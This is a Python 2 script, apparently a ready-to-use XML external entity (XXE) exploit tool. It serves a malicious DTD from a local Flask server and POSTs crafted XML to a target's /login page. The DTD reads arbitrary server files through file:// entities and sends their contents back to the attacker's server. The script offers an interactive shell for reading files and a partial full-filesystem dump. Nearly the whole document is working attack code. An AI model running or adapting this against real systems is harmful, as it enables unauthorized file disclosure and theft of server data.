#!/usr/bin/env python

import os
import logging
import socket
import thread
import time

import requests
from flask import Flask, request

# Turning off flask verbose
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# Your external adress, will be send as go-get-there-dtd adress
local_ip = "10.11.12.244"
local_port = 80
local_adress = local_ip + ":" + str(local_port)
# Target ip
target_ip = "10.11.12.72"
# URL path that accepts XML
url = "/login"
# Content of an initiating HTTP request
http_content = '''<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://'''+local_ip+'''/exploit.dtd">
<foo>&e1;</foo>'''
# Need to set content-ty to xml to make it work
headers = {'content-type': 'text/xml'}
# Flag that tells us if the target requested DTD from us
awaiting_response = False
# Command to start with
commad = "/"
# Storage from response from target
resp = ""

app = Flask(__name__)

# DTD serveing function
@app.route("/exploit.dtd")
def serve():
    # TODO: add support for php:// schema
    dtd_packet = '''<!ENTITY % p1 SYSTEM "file://'''+commad+'''">
    <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://'''+local_adress+'''/result?resp=%p1;'>">
    %p2;'''
    return dtd_packet

# Result handler
@app.route("/result")
def report():
    global awaiting_response
    global resp
    try:
        # Set the flag to false if we got something
        awaiting_response = False
        resp = request.args.get('resp')
    except:
        pass
    return "200"

def flaskThread():
    app.run(local_ip, local_port)

def banner():
    print r'''__________.____    ________   ________   ________  .____     '''
    print r'''\____    /|    |   \_____  \  \_____  \  \_____  \ |    |   '''
    print r'''  /     / |    |    /   |   \  /   |   \  /   |   \|    |    '''
    print r''' /     /_ |    |___/    |    \/    |    \/    |    \    |___ '''
    print r'''/_______ \|_______ \_______  /\_______  /\_______  /_______ \\'''
    print r'''        \/        \/       \/         \/         \/        \/@zloool'''
    print r'''XXE dtd interactive script:'''


def attack(user_input):
    global resp
    global commad
    commad = user_input
    resp = "no response"
    # proxies={"http":"127.0.0.1:8080"}
    requests.post("http://" + target_ip + url, http_content, headers=headers,)
    time.sleep(0.5)
    return resp


def cmd_loop():
    global awaiting_response
    while True:
        if awaiting_response:
            print "< ",
            print "no response"
            print "> ",
            awaiting_response = False
        else:
            print "> ",
        user_input = raw_input()
        if user_input in ("exit", "leave", "exit()"):
            exit()
        awaiting_response = True
        response = attack(user_input)
        print "< "
        print response,

# Iterative function to get all content of the server filesystem


def full_dump():
    # List of all folders
    folders = list()
    # Filder to start with
    folders.append("")
    for folder in folders:
        # TODO: Dont add file lines to folder list
        is_file = False
        attack_result = attack("/" + folder)
        listing = attack_result.split("\n")
        if "no response" in listing:
            # Means that file is not readable(binary or no read rights)
            print folder, " <-_->"
        else:
            # TODO: dump results in file instead of stdout
            print folder
        # Currently useless condition
        if not is_file:
            for res in listing:
                if res not in folders:
                    folders.append(folder + "/" + res)


if __name__ == '__main__':
    banner()
    thread.start_new_thread(flaskThread, ())
    # Uncomment next line if you want to make full dump (currently not working as intended)
    #full_dump()
    cmd_loop()
